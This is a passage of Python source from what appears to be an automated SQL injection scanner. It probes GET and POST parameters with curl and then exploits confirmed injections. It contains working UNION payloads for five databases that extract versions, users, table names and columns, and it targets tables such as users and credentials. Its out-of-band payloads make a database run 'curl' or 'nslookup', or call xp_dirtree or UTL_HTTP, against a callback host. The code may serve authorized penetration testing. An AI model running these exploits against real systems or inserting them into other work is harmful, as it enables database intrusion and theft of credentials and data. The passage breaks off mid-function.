    # Separate GET and POST endpoints to ensure both get tested
    def _method_allowed(endpoint: dict[str, Any], method: str) -> bool:
        allowed = endpoint.get("allowed_methods")
        if allowed:
            return method in [m.upper() for m in allowed]
        return True

    get_endpoints = [
        e for e in endpoints
        if e.get("method", "GET").upper() == "GET"
        and e.get("params")
        and _method_allowed(e, "GET")
        and not _is_hash_route(e.get("url", ""))
        and not _is_sqli_documentation_noise_endpoint(e)
    ]
    post_endpoints = [
        e for e in endpoints
        if e.get("method", "GET").upper() in ("POST", "PUT", "PATCH")
        and e.get("body_params")
        and _method_allowed(e, e.get("method", "GET").upper())
        and not _is_sqli_documentation_noise_endpoint(e)
    ]

    # Value-sort so real, observed injection points lead. Otherwise a flood of GET
    # endpoints (incl. synthetic OPTIONS-derived /api/<Model>s/<action> permutations)
    # consumes the whole budget before real endpoints like POST /rest/user/login.
    get_endpoints = _prioritize_active_endpoints(get_endpoints)
    post_endpoints = _prioritize_active_endpoints(post_endpoints)
    # Guarantee POST-body endpoints (the high-value injection surface) get a share of
    # the budget. The COUNT reservation is the reliable guard (a single slow GET
    # iteration can overshoot a time deadline); the time deadline is a secondary cap.
    _post_reserve = min(len(post_endpoints), max(1, max_endpoints // 2)) if post_endpoints else 0
    _get_cap = max(1, max_endpoints - _post_reserve)
    _get_phase_deadline = None
    if deadline is not None and post_endpoints and get_endpoints:
        _get_phase_deadline = time.monotonic() + max(1.0, (deadline - time.monotonic()) * 0.6)

    # Test GET endpoints (capped to reserve budget for POST-body endpoints)
    for endpoint in get_endpoints[:_get_cap]:
        if _budget_exhausted():
            break
        if _get_phase_deadline is not None and time.monotonic() >= _get_phase_deadline:
            print("[sqli] GET phase reserve hit; reserving budget for POST-body endpoints", file=sys.stderr)
            break
        endpoint_url = endpoint.get("url", "")
        params = _coerce_param_names(endpoint.get("params") or endpoint.get("query_params"))
        param_defaults = endpoint.get("param_defaults") or endpoint.get("query_param_defaults") or {}

        if not params:
            continue

        attempt = _new_endpoint_attempt(
            endpoint,
            "sqli",
            url_override=endpoint_url,
            method_override="GET",
            params=list(params),
        )
        results["endpoints_tested"] += 1
        results["get_endpoints_tested"] += 1
        _emit_sqli_progress(f"testing GET endpoint {endpoint_url}")

        # Detect DBMS if not known
        if not results["dbms_detected"] and params:
            detection = await detect_dbms(endpoint_url, params[0])
            if detection["detected"]:
                results["dbms_detected"] = detection["detected"]
                print(f"[sqli] Detected DBMS: {detection['detected']}", file=sys.stderr)

        # Get appropriate payloads
        dbms_key = results["dbms_detected"] or "generic"
        payloads = _select_sqli_payloads(dbms_key)

        for param in params[:max_params_per_endpoint]:
            if _budget_exhausted():
                break
            results["params_tested"] += 1
            if attempt is not None:
                attempt["attempted_params_count"] += 1
            _emit_sqli_progress(f"testing GET param {param}")
            # Get baseline
            parsed = urllib.parse.urlparse(endpoint_url)
            baseline_params = dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))
            for name, value in param_defaults.items():
                if name not in baseline_params:
                    baseline_params[name] = _stringify_body_value(value)
            # Distinctive canary so we can detect whether this parameter is
            # reflected into the response (echoed input mimics data extraction).
            reflection_canary = f"zqSqli{random.randint(100000, 999999)}cx"
            baseline_params[param] = reflection_canary
            baseline_query = urllib.parse.urlencode(baseline_params)
            baseline_url = urllib.parse.urlunparse(parsed._replace(query=baseline_query))

            baseline_start = time.time()
            baseline_cmd = [
                "curl", "-sS", "-L", "-k", "--max-time", "10",
                "-H", "User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)",
            ] + auth_args + ["-w", f"\n{_CURL_STATUS_MARKER}%{{http_code}}", baseline_url]

            baseline_out, _, baseline_rc = await run(baseline_cmd, timeout=12)
            baseline_elapsed = time.time() - baseline_start
            if attempt is not None:
                attempt["completed_params_count"] += 1

            if baseline_rc != 0:
                continue

            baseline_body, baseline_status = _parse_curl_body_status(baseline_out)
            baseline_len = len(baseline_body) if baseline_body else 0
            # If the canary echoes back, this parameter reflects input — any
            # in-response "extraction" token must be treated as reflection.
            param_reflected = bool(baseline_body and reflection_canary in baseline_body)

            if baseline_status in (405, 415):
                continue

            for payload, technique, description in payloads:
                if _budget_exhausted():
                    break
                # §5: record which SQLi techniques were attempted per endpoint
                # (boolean/error/union/auth-bypass/extraction/OOB) so coverage shows
                # depth, not just "tested".
                if attempt is not None:
                    attempt.setdefault("techniques_attempted", set()).add(technique)
                # Inject payload
                test_params = dict(baseline_params)
                test_params[param] = payload
                test_query = urllib.parse.urlencode(test_params)
                test_url = urllib.parse.urlunparse(parsed._replace(query=test_query))

                start_time = time.time()
                test_cmd = [
                    "curl", "-sS", "-L", "-k", "--max-time", "15",
                    "-H", "User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)",
                ] + auth_args + ["-w", f"\n{_CURL_STATUS_MARKER}%{{http_code}}", test_url]
                out, err, rc = await run(test_cmd, timeout=18)
                elapsed = time.time() - start_time

                if rc != 0:
                    continue

                body_out, status_code = _parse_curl_body_status(out)
                is_vulnerable, evidence = _check_sqli_response(
                    body_out, baseline_len, elapsed, technique, results["dbms_detected"],
                    status_code=status_code,
                    baseline_status=baseline_status,
                    baseline_elapsed=baseline_elapsed,
                    baseline_body=baseline_body,
                    payload=payload,
                    reflected=param_reflected,
                )

                if is_vulnerable:
                    if not results["dbms_detected"]:
                        fingerprint = _match_dbms_fingerprint(body_out, baseline_body)
                        if fingerprint:
                            results["dbms_detected"] = fingerprint["dbms"]
                    is_auth_bypass = any("Authentication bypass via SQLi" in item for item in evidence)
                    finding_dict = {
                        "type": "SQLi",
                        "method": "GET",
                        "url": endpoint_url,
                        "param": param,
                        "payload": payload,
                        "technique": technique,
                        "dbms": results["dbms_detected"],
                        "evidence": evidence,
                        "confidence": 0.9 if len(evidence) > 1 else 0.7,
                        "severity": "critical" if "schema" in technique or is_auth_bypass else "high",
                    }
                    request_headers = _headers_from_curl_args(auth_args)
                    if request_headers:
                        finding_dict["request_headers"] = request_headers
                    results["findings"].append(finding_dict)
                    results["vulnerabilities_found"] += 1
                    break  # One confirmed SQLi per param is enough

        finished = _finish_endpoint_attempt(
            attempt,
            budget_exhausted=bool(results.get("budget_exhausted")),
            budget_exhausted_reason=results.get("budget_exhausted_reason"),
        )
        if finished:
            results["endpoint_attempts"].append(finished)

    # Test POST endpoints
    for endpoint in post_endpoints[:max_endpoints]:
        if _budget_exhausted():
            break
        endpoint_url = endpoint.get("url", "")
        method = endpoint.get("method", "POST").upper()
        body_params = _coerce_param_names(endpoint.get("body_params") or endpoint.get("params"))
        content_type = endpoint.get("content_type") or "application/json"

        if not body_params:
            continue

        attempt = _new_endpoint_attempt(
            endpoint,
            "sqli",
            url_override=endpoint_url,
            method_override=method,
            body_params=list(body_params),
        )
        results["endpoints_tested"] += 1
        results["post_endpoints_tested"] += 1
        _emit_sqli_progress(f"testing {method} endpoint {endpoint_url}")

        base_body = _build_body_template(endpoint)
        auth_post_args = _filter_curl_headers(auth_args, {"content-type"})
        is_array_body = isinstance(base_body, list)
        if is_array_body and "json" not in content_type.lower():
            finished = _finish_endpoint_attempt(attempt, skipped_reason="unsupported_array_body_content_type")
            if finished:
                results["endpoint_attempts"].append(finished)
            continue

        # Detect DBMS via POST/PUT/PATCH if not known yet
        if not results["dbms_detected"] and body_params:
            detection = await _detect_dbms_post(
                endpoint_url,
                body_params[0],
                content_type,
                auth_post_args,
                method=method,
                base_body=base_body,
            )
            if detection["detected"]:
                results["dbms_detected"] = detection["detected"]
                print(f"[sqli] Detected DBMS via {method}: {detection['detected']}", file=sys.stderr)

        # Get appropriate payloads
        dbms_key = results["dbms_detected"] or "generic"
        payloads = _select_sqli_payloads(dbms_key)

        print(f"[sqli] Testing {method} endpoint: {endpoint_url} with params: {body_params[:max_params_per_endpoint]}", file=sys.stderr)

        for param in body_params[:max_params_per_endpoint]:
            if _budget_exhausted():
                break
            results["params_tested"] += 1
            if attempt is not None:
                attempt["attempted_params_count"] += 1
            _emit_sqli_progress(f"testing {method} param {param}")
            # Distinctive canary embedded in the baseline so we can detect
            # whether this body parameter is reflected into the response.
            reflection_canary = f"zqSqli{random.randint(100000, 999999)}cx"
            # Build baseline for THIS param
            if is_array_body:
                baseline_body = copy.deepcopy(base_body)
                if not baseline_body:
                    baseline_body = [{}] if param != "__item__" else [""]
                if isinstance(baseline_body[0], dict):
                    if param not in baseline_body[0]:
                        baseline_body[0][param] = _fallback_value_for_param(param)
                    if isinstance(baseline_body[0][param], str):
                        baseline_body[0][param] = f"{baseline_body[0][param]}{reflection_canary}"
                else:
                    base_val = baseline_body[0] if baseline_body else _fallback_value_for_param(param)
                    if not isinstance(base_val, str):
                        base_val = str(base_val)
                    baseline_body[0] = f"{base_val}{reflection_canary}"
            else:
                baseline_body = dict(base_body) if base_body else {}
                if param not in baseline_body:
                    baseline_body[param] = _fallback_value_for_param(param)
                if isinstance(baseline_body[param], str):
                    baseline_body[param] = f"{baseline_body[param]}{reflection_canary}"

            baseline_body_args, baseline_header_args = _build_curl_body_args(baseline_body, content_type)
            baseline_start = time.time()
            baseline_cmd = [
                "curl", "-sS", "-X", method, "-L", "-k", "--max-time", "10",
                "-H", "User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)",
            ] + baseline_header_args + auth_post_args + baseline_body_args + ["-w", f"\n{_CURL_STATUS_MARKER}%{{http_code}}", endpoint_url]

            baseline_out, _, baseline_rc = await run(baseline_cmd, timeout=12)
            baseline_elapsed = time.time() - baseline_start
            if attempt is not None:
                attempt["completed_params_count"] += 1

            if baseline_rc != 0:
                continue

            baseline_body_out, baseline_status = _parse_curl_body_status(baseline_out)
            baseline_len = len(baseline_body_out) if baseline_body_out else 0
            param_reflected = bool(baseline_body_out and reflection_canary in baseline_body_out)

            if baseline_status in (405, 415):
                continue

            # Test payloads for THIS param
            for payload, technique, description in payloads:
                if _budget_exhausted():
                    break
                # §5: record SQLi techniques attempted for POST/body params too (not
                # just GET) so per-endpoint technique telemetry is complete.
                if attempt is not None:
                    attempt.setdefault("techniques_attempted", set()).add(technique)
                test_body = _apply_body_param(baseline_body, param, payload)
                test_body_args, test_header_args = _build_curl_body_args(test_body, content_type)

                start_time = time.time()
                test_cmd = [
                    "curl", "-sS", "-X", method, "-L", "-k", "--max-time", "15",
                    "-H", "User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)",
                ] + test_header_args + auth_post_args + test_body_args + ["-w", f"\n{_CURL_STATUS_MARKER}%{{http_code}}", endpoint_url]

                out, err, rc = await run(test_cmd, timeout=18)
                elapsed = time.time() - start_time

                if rc != 0:
                    continue

                body_out, status_code = _parse_curl_body_status(out)

                # For boolean techniques, test true condition to enable comparison
                true_condition_len = None
                if "boolean" in technique:
                    # Test the inverse/true condition for comparison
                    true_payload = payload.replace("1=2", "1=1").replace("'1'='2", "'1'='1")
                    if true_payload != payload:  # Only if we actually have a false->true transform
                        true_body = _apply_body_param(baseline_body, param, true_payload)
                        true_body_args, true_header_args = _build_curl_body_args(true_body, content_type)
                        true_cmd = [
                            "curl", "-sS", "-X", method, "-L", "-k", "--max-time", "15",
                            "-H", "User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)",
                        ] + true_header_args + auth_post_args + true_body_args + ["-w", f"\n{_CURL_STATUS_MARKER}%{{http_code}}", endpoint_url]
                        true_out, _, true_rc = await run(true_cmd, timeout=18)
                        if true_rc == 0:
                            true_body_out, _ = _parse_curl_body_status(true_out)
                            true_condition_len = len(true_body_out) if true_body_out else 0

                is_vulnerable, evidence = _check_sqli_response(
                    body_out, baseline_len, elapsed, technique, results["dbms_detected"],
                    status_code=status_code,
                    baseline_status=baseline_status,
                    baseline_elapsed=baseline_elapsed,
                    baseline_body=baseline_body_out,
                    true_condition_len=true_condition_len,
                    payload=payload,
                    reflected=param_reflected,
                )

                if is_vulnerable:
                    if not results["dbms_detected"]:
                        fingerprint = _match_dbms_fingerprint(body_out, baseline_body_out)
                        if fingerprint:
                            results["dbms_detected"] = fingerprint["dbms"]
                    is_auth_bypass = any("Authentication bypass via SQLi" in item for item in evidence)
                    request_headers = _headers_from_curl_args(auth_args)
                    if method in ("POST", "PUT", "PATCH") and content_type:
                        request_headers.setdefault("Content-Type", content_type)

                    finding_dict = {
                        "type": "SQLi",
                        "method": method,
                        "url": endpoint_url,
                        "param": param,
                        "payload": payload,
                        "technique": technique,
                        "dbms": results["dbms_detected"],
                        "evidence": evidence,
                        "confidence": 0.9 if len(evidence) > 1 else 0.7,
                        "severity": "critical" if "schema" in technique or is_auth_bypass else "high",
                    }
                    # Include content_type and original body for POST verification replay
                    if method in ("POST", "PUT", "PATCH"):
                        finding_dict["content_type"] = content_type
                        # Store baseline body (without the injected payload) for replay
                        finding_dict["body"] = json.dumps(base_body) if "json" in content_type.lower() else urllib.parse.urlencode(base_body)
                    if request_headers:
                        finding_dict["request_headers"] = request_headers
                    results["findings"].append(finding_dict)
                    results["vulnerabilities_found"] += 1
                    print(f"[sqli] {method} SQLi FOUND in {endpoint_url} param={param}", file=sys.stderr)
                    break  # One confirmed SQLi per param is enough

        finished = _finish_endpoint_attempt(
            attempt,
            budget_exhausted=bool(results.get("budget_exhausted")),
            budget_exhausted_reason=results.get("budget_exhausted_reason"),
        )
        if finished:
            results["endpoint_attempts"].append(finished)

    _emit_sqli_progress("SQLi probes complete", force=True)
    return results


# DBMS-specific data extraction payloads for SQLi chaining
SQLI_EXTRACTION_PAYLOADS = {
    "mysql": {
        "version": "' UNION SELECT NULL,@@version,NULL-- -",
        "user": "' UNION SELECT NULL,user(),NULL-- -",
        "database": "' UNION SELECT NULL,database(),NULL-- -",
        "tables": "' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database()-- -",
        "columns": "' UNION SELECT NULL,GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_name='{table}'-- -",
    },
    "postgresql": {
        "version": "' UNION SELECT NULL,version(),NULL--",
        "user": "' UNION SELECT NULL,current_user,NULL--",
        "database": "' UNION SELECT NULL,current_database(),NULL--",
        "tables": "' UNION SELECT NULL,string_agg(tablename,','),NULL FROM pg_tables WHERE schemaname='public'--",
        "columns": "' UNION SELECT NULL,string_agg(column_name,','),NULL FROM information_schema.columns WHERE table_name='{table}'--",
    },
    "sqlite": {
        "version": "' UNION SELECT NULL,sqlite_version(),NULL--",
        "tables": "' UNION SELECT NULL,GROUP_CONCAT(name),NULL FROM sqlite_master WHERE type='table'--",
        "columns": "' UNION SELECT NULL,sql,NULL FROM sqlite_master WHERE name='{table}'--",
    },
    "mssql": {
        "version": "' UNION SELECT NULL,@@version,NULL--",
        "user": "' UNION SELECT NULL,SYSTEM_USER,NULL--",
        "database": "' UNION SELECT NULL,DB_NAME(),NULL--",
        "tables": "' UNION SELECT NULL,STRING_AGG(name,','),NULL FROM sysobjects WHERE xtype='U'--",
    },
    "oracle": {
        "version": "' UNION SELECT NULL,banner,NULL FROM v$version--",
        "user": "' UNION SELECT NULL,USER,NULL FROM dual--",
        "database": "' UNION SELECT NULL,GLOBAL_NAME,NULL FROM global_name--",
        "tables": "' UNION SELECT NULL,LISTAGG(table_name, ',') WITHIN GROUP (ORDER BY table_name),NULL FROM user_tables--",
    },
}

SQLI_VERSION_EXTRACTION_PATTERNS = {
    "mysql": [r"\b(?:MySQL|MariaDB)\s+(\d+(?:\.\d+)+[^\s<]*)"],
    "postgresql": [r"\bPostgreSQL\s+(\d+(?:\.\d+)+[^\s<]*)"],
    "mssql": [r"\bMicrosoft\s+SQL\s+Server\b[^\n<]{0,120}(\d{4}|\d+(?:\.\d+)+)"],
    "sqlite": [r"\bSQLite\s+(\d+(?:\.\d+)+[^\s<]*)"],
    "oracle": [r"\bOracle(?:\s+Database)?\b[^\n<]{0,120}(\d+(?:c|g)?|\d+(?:\.\d+)+)"],
}

SQLI_SENSITIVE_EXTRACTION_PATTERNS = {
    "password_hash": r'"password_hash"\s*:',
    "api_key": r'"api_key"\s*:',
    "secret": r'"[^"]*secret[^"]*"\s*:',
    "token": r'"[^"]*token[^"]*"\s*:',
    "row_count": r'"row_count"\s*:\s*[1-9]\d*',
    "vulnerable_flag": r'"vulnerable"\s*:\s*true',
}


async def sqli_data_extraction(
    sqli_finding: dict,
    auth_session: Any | None = None,
    max_extractions: int = 5
) -> dict:
    """
    Attempt to extract actual data after confirming SQL injection.

    This function chains from a confirmed SQLi finding to extract:
    1. Database version/user info (proof of exploitation)
    2. Table names
    3. Column names for interesting tables
    4. Sample data (if safe)

    Args:
        sqli_finding: A confirmed SQLi finding from smart_sqli_test
        auth_session: AuthSession for authenticated requests
        max_extractions: Maximum number of extraction attempts

    Returns:
        Dict with extracted data and evidence
    """
    results = {
        "extraction_successful": False,
        "extracted_data": {},
        "evidence": [],
        "dbms_confirmed": None,
        "tables_found": [],
        "columns_found": {},
    }

    url = sqli_finding.get("url", "")
    param = sqli_finding.get("param", "")
    dbms = str(sqli_finding.get("dbms") or "").lower()
    method = sqli_finding.get("method", "GET")

    if not url or not param:
        return results
    if _is_sqli_documentation_endpoint(url):
        results["skipped"] = True
        results["reason"] = "documentation_endpoint"
        return results
    if dbms not in SQLI_EXTRACTION_PAYLOADS:
        results["skipped"] = True
        results["reason"] = "unsupported_or_unknown_dbms"
        return results

    auth_args = get_auth_curl_args(auth_session)
    extraction_payloads = SQLI_EXTRACTION_PAYLOADS[dbms]

    print(f"[sqli-extract] Attempting data extraction from {url} param={param} dbms={dbms}", file=sys.stderr)

    async def send_payload(payload: str) -> tuple[str, int]:
        """Send a payload and return (body, status_code)."""
        parsed = urllib.parse.urlparse(url)

        if method == "GET":
            query_params = dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))
            query_params[param] = payload
            test_query = urllib.parse.urlencode(query_params)
            test_url = urllib.parse.urlunparse(parsed._replace(query=test_query))

            cmd = [
                "curl", "-sS", "-L", "-k", "--max-time", "15",
                "-H", "User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)",
            ] + auth_args + ["-w", f"\n{_CURL_STATUS_MARKER}%{{http_code}}", test_url]
        else:
            # POST method
            test_url = url
            body_data = {param: payload}
            cmd = [
                "curl", "-sS", "-L", "-k", "--max-time", "15", "-X", method,
                "-H", "User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)",
                "-H", "Content-Type: application/json",
                "-d", json.dumps(body_data),
            ] + auth_args + ["-w", f"\n{_CURL_STATUS_MARKER}%{{http_code}}", test_url]

        out, _, rc = await run(cmd, timeout=20)
        if rc != 0 or not out:
            return "", 0

        body, status = _parse_curl_body_status(out)
        return body or "", status or 0

    baseline_body, baseline_status = await send_payload(_stringify_body_value(_fallback_value_for_param(param)))

    def _match_not_in_baseline(pattern: str, body: str) -> re.Match[str] | None:
        match = re.search(pattern, body or "", re.I)
        if not match:
            return None
        matched_text = match.group(0)
        baseline_match = re.search(pattern, baseline_body or "", re.I)
        if baseline_match:
            return None
        if matched_text and matched_text in (baseline_body or ""):
            return None
        return match

    # Try to extract database version
    if "version" in extraction_payloads:
        body, status = await send_payload(extraction_payloads["version"])
        if status == 200 and body:
            version_patterns = SQLI_VERSION_EXTRACTION_PATTERNS.get(str(dbms).lower(), [])
            for pattern in version_patterns:
                match = _match_not_in_baseline(pattern, body)
                if match:
                    results["extracted_data"]["version"] = match.group(1)
                    results["dbms_confirmed"] = dbms
                    results["extraction_successful"] = True
                    results["evidence"].append(f"Extracted version: {match.group(1)}")
                    break
            if not results["extraction_successful"]:
                sensitive_markers = [
                    label
                    for label, pattern in SQLI_SENSITIVE_EXTRACTION_PATTERNS.items()
                    if _match_not_in_baseline(pattern, body)
                ]
                has_secret_marker = any(
                    label in sensitive_markers
                    for label in ("password_hash", "api_key", "secret", "token")
                )
                if has_secret_marker and len(sensitive_markers) >= 2:
                    results["extracted_data"]["sensitive_markers"] = sensitive_markers
                    results["dbms_confirmed"] = dbms
                    results["extraction_successful"] = True
                    results["evidence"].append(
                        f"Extracted sensitive rowset markers: {', '.join(sensitive_markers)}"
                    )

    # Try to extract current user
    if "user" in extraction_payloads and results["extraction_successful"]:
        body, status = await send_payload(extraction_payloads["user"])
        if status == 200 and body:
            # Look for user patterns
            user_patterns = [
                r"root@[\w.-]+",
                r"[\w]+@[\w.-]+",
                r"(?:user|admin|dbo|postgres)(?:@[\w.-]+)?",
            ]
            for pattern in user_patterns:
                match = _match_not_in_baseline(pattern, body)
                if match:
                    results["extracted_data"]["user"] = match.group(0)
                    results["evidence"].append(f"Extracted user: {match.group(0)}")
                    break

    # Try to extract database name
    if "database" in extraction_payloads and results["extraction_successful"]:
        body, status = await send_payload(extraction_payloads["database"])
        if status == 200 and body:
            # Look for database name in response (usually a single word)
            db_match = re.search(r'[\w_-]{2,30}', body)
            if db_match:
                db_name = db_match.group(0)
                baseline_tokens = set(re.findall(r"[\w_-]{2,30}", baseline_body or "", re.I))
                if db_name not in ["null", "NULL", "undefined", "error", "Error"] and db_name not in baseline_tokens:
                    results["extracted_data"]["database"] = db_name
                    results["evidence"].append(f"Extracted database: {db_name}")

    # Try to extract table names
    if "tables" in extraction_payloads and results["extraction_successful"]:
        body, status = await send_payload(extraction_payloads["tables"])
        if status == 200 and body:
            # Look for comma-separated table names
            # Filter out common words that aren't table names
            exclude_words = {"error", "null", "undefined", "true", "false", "type", "message"}
            potential_tables = re.findall(r'\b([a-z_][a-z0-9_]{2,30})\b', body, re.I)
            baseline_tokens = {token.lower() for token in re.findall(r'\b([a-z_][a-z0-9_]{2,30})\b', baseline_body or "", re.I)}
            tables = [t for t in potential_tables if t.lower() not in exclude_words and t.lower() not in baseline_tokens]

            if tables:
                # Deduplicate and limit
                results["tables_found"] = list(dict.fromkeys(tables))[:20]
                results["evidence"].append(f"Found {len(results['tables_found'])} tables")

    # Try to extract columns for interesting tables
    interesting_tables = ["users", "accounts", "credentials", "passwords", "admins", "customers"]
    if results["tables_found"] and "columns" in extraction_payloads:
        for table in results["tables_found"][:max_extractions]:
            if any(interesting in table.lower() for interesting in interesting_tables):
                payload = extraction_payloads["columns"].replace("{table}", table)
                body, status = await send_payload(payload)
                if status == 200 and body:
                    columns = re.findall(r'\b([a-z_][a-z0-9_]{2,30})\b', body, re.I)
                    if columns:
                        results["columns_found"][table] = list(dict.fromkeys(columns))[:15]
                        results["evidence"].append(f"Table {table}: {', '.join(columns[:5])}")

    # Summarize findings
    if results["extraction_successful"]:
        results["severity_upgrade"] = "critical"  # Upgrade to critical with data extraction proof
        results["proof_of_exploitation"] = True

    return results


async def oob_sqli_test(
    url: str,
    param: str,
    dbms: str | None = None,
    callback_url: str | None = None,
    auth_session: Any | None = None
) -> dict:
    """
    Test for Out-of-Band SQL injection using DNS/HTTP callbacks.

    This function sends payloads that cause the database to make external
    requests if vulnerable. Requires a callback server to detect.

    Args:
        url: Target URL
        param: Parameter to test
        dbms: Detected DBMS (or None for generic)
        callback_url: URL for the callback server (e.g., Burp Collaborator)
        auth_session: AuthSession for authenticated requests

    Returns:
        Dict with findings (requires manual callback verification)
    """
    results = {
        "payloads_sent": [],
        "requires_callback_verification": True,
        "callback_url": callback_url,
        "potential_oob": False,
    }

    if not callback_url:
        # Generate a placeholder - in real use, this would be a Burp Collaborator URL
        callback_url = "oob-test.example.com"
        results["note"] = "No callback URL provided. Payloads sent but verification not possible."

    auth_args = get_auth_curl_args(auth_session)

    # OOB payloads for different DBMS
    oob_payloads = {
        "mysql": [
            f"' AND LOAD_FILE('\\\\\\\\{callback_url}\\\\test')-- -",
            f"' UNION SELECT LOAD_FILE('\\\\\\\\{callback_url}\\\\test')-- -",
        ],
        "postgresql": [
            f"'; COPY (SELECT '') TO PROGRAM 'nslookup {callback_url}'--",
            f"'; CREATE TABLE IF NOT EXISTS oob(data text); COPY oob FROM PROGRAM 'curl {callback_url}'--",
        ],
        "mssql": [
            f"'; EXEC master..xp_dirtree '\\\\{callback_url}\\test'--",
            f"'; EXEC master..xp_fileexist '\\\\{callback_url}\\test'--",
            f"'; DECLARE @q varchar(200); SET @q='\\\\{callback_url}\\test'; EXEC master..xp_dirtree @q--",
        ],
        "oracle": [
            f"' UNION SELECT UTL_HTTP.REQUEST('http://{callback_url}/') FROM dual--",
            f"' UNION SELECT HTTPURITYPE('http://{callback_url}/').getclob() FROM dual--",
        ],
    }

    # Get appropriate payloads
    if dbms and dbms in oob_payloads:
        payloads = oob_payloads[dbms]
    else:
        # Try all
        payloads = []
        for dbms_payloads in oob_payloads.values():
            payloads.extend(dbms_payloads[:2])  # Take 2 from each

    parsed = urllib.parse.urlparse(url)

    for payload in payloads:
        query_params = dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))
        query_params[param] = payload
        test_query = urllib.parse.urlencode(query_params)
        test_url = urllib.parse.urlunparse(parsed._replace(query=test_query))

        cmd = [
            "curl", "-sS", "-L", "-k", "--max-time", "15",
            "-H", "User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)",
        ] + auth_args + [test_url]

        await run(cmd, timeout=20)

        results["payloads_sent"].append({
            "dbms": dbms,
            "payload": payload,
            "callback_domain": callback_url,
        })

    results["potential_oob"] = len(results["payloads_sent"]) > 0

    return results


def _try_parse_json(text: str | None) -> dict | list | None:
    """Attempt to parse JSON, return None if not valid JSON."""
    if not text:
        return None
    try:
        return json.loads(text)
    except (json.JSONDecodeError, ValueError):
        return None


def _auth_success_signals_from_body(body: str | None) -> list[str]:
    """Return strict authentication-success signals from a response body."""
    if not body:
        return []
    signals: set[str] = set()
    parsed = _try_parse_json(body)
    if parsed is not None:
        keys = {key.lower() for key in _extract_json_keys(parsed)}
        auth_key_fragments = (
            "token", "access_token", "accesstoken", "refresh_token", "refreshtoken",
            "jwt", "session", "authentication", "authorization",
        )
        identity_key_fragments = (
            "user", "username", "email", "role", "roles", "account", "profile", "umail",
        )
        if any(any(fragment in key for fragment in auth_key_fragments) for key in keys):
            signals.add("auth_token_or_session")
        if any(any(fragment in key for fragment in identity_key_fragments) for key in keys):
            signals.add("user_identity_data")

    lowered = body.lower()
    auth_markers = (
        '"token"', '"access_token"', '"accessToken"', '"refresh_token"',
        '"authentication"', '"authorization"', '"jwt"', '"session"',
    )
    identity_markers = (
        '"user"', '"username"', '"email"', '"role"', '"roles"', '"account"', '"profile"', '"umail"',
    )
    if any(marker.lower() in lowered for marker in auth_markers):
        signals.add("auth_token_or_session")
    if any(marker.lower() in lowered for marker in identity_markers):
        signals.add("user_identity_data")
    return sorted(signals)


def _looks_like_auth_failure_response(status: int | None, body: str | None) -> bool:
    lowered = (body or "").lower()
    failure_markers = (
        "invalid credentials", "invalid email", "invalid password",
        "invalid email or password", "login failed", "authentication failed",
        "unauthorized", "forbidden", "wrong password", "user not found",
    )
    return status in {400, 401, 403, 404, 422} or any(marker in lowered for marker in failure_markers)


def _extract_json_keys(obj: Any, prefix: str = "") -> set[str]:
    """Extract all keys from a JSON object recursively."""
    keys: set[str] = set()
    if isinstance(obj, dict):
        for k, v in obj.items():
            key = f"{prefix}.{k}" if prefix else k
            keys.add(key)
            keys.update(_extract_json_keys(v, key))
    elif isinstance(obj, list) and obj:
        keys.update(_extract_json_keys(obj[0], f"{prefix}[]"))
    return keys


def _get_array_lengths(obj: Any, prefix: str = "") -> dict[str, int]:
    """Get lengths of all arrays in JSON object."""
    lengths: dict[str, int] = {}
    if isinstance(obj, dict):
        for k, v in obj.items():
            key = f"{prefix}.{k}" if prefix else k
            lengths.update(_get_array_lengths(v, key))
    elif isinstance(obj, list):
        lengths[prefix or "root"] = len(obj)
        if obj:
            lengths.update(_get_array_lengths(obj[0], f"{prefix}[]"))
    return lengths


def _check_sqli_response(
    out: str | None,
    baseline_len: int,
    elapsed: float,
    technique: str,
    dbms_detected: str | None,
    status_code: int | None = None,
    baseline_status: int | None = None,
    baseline_elapsed: float | None = None,
    baseline_body: str | None = None,
    true_condition_len: int | None = None,
    payload: str | None = None,
    reflected: bool = False,
) -> tuple[bool, list[str]]:
    """Check response for SQLi indicators with enhanced blind SQLi heuristics.

    When ``payload`` is provided, schema/version extraction keywords that also
    appear in the injected payload are ignored: an echoed ``information_schema``
    (or any other reflected SQL keyword) is reflection, not exfiltrated data, and
    must not be counted as proof.

    When ``reflected`` is True the parameter has been confirmed to echo arbitrary
    input back into the response (via a canary pre-check). In that case the
    data-extraction-indicator heuristic is suppressed entirely: a token like
    ``@@version`` or ``sqlite_master`` appearing in the body cannot be
    distinguished from the reflected payload, so it is not proof. Only
    behavioral signals (time-based delay, boolean diff, DB error fingerprints
    not present in the baseline) remain trustworthy.

    Returns:
        Tuple of (is_vulnerable, evidence_list)
    """
    response_len = len(out) if out else 0
    strong_signal = False
    evidence = []
    size_diff = None

    # 1. Check for SQL errors
    fingerprint = _match_dbms_fingerprint(out, baseline_body)
    if fingerprint:
        strong_signal = True
        evidence.append(f"SQL error detected ({fingerprint['dbms']}): {fingerprint['pattern']}")

    # 2. Check for time-based injection (enhanced with adaptive tolerance)
    if "time" in technique:
        if baseline_status in (401, 403, 405, 415, 429):
            pass
        else:
            expected_delay = 2.0  # Payloads typically use SLEEP(2) or WAITFOR DELAY '0:0:2'
            if baseline_elapsed is None:
                # No baseline - use simple threshold
                if elapsed >= 2.0:
                    strong_signal = True
                    evidence.append(f"Time-based delay: {elapsed:.2f}s (no baseline)")
            else:
                actual_delay = elapsed - baseline_elapsed
                # Adaptive tolerance based on baseline variance
                # For fast sites (baseline < 0.5s), require closer to expected delay
                # For slow sites (baseline > 2s), allow more tolerance
                min_delay = max(1.5, expected_delay * 0.75)
                max_delay = expected_delay * 2.5  # Cap at 5s for SLEEP(2)

                if min_delay <= actual_delay <= max_delay:
                    strong_signal = True
                    # Confidence based on how close to expected delay
